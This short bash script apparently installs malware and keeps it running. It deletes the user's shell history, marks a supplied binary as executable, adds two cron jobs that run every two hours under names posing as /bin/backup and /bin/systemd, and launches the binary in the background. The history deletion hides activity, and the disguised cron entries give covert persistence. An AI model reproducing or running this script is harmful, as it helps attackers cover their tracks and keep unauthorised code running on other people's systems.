#!/bin/bash
rm -rf ~/.bash_history
chmod u+x $1
(crontab -l 2>/dev/null; echo "1 0-23/2 * * * /bin/backup $2 $3 $4") | crontab -
(crontab -l 2>/dev/null; echo "1 0-23/2 * * * /bin/systemd $2 $3 $4") | crontab -
./$1 $2 $3 $4 &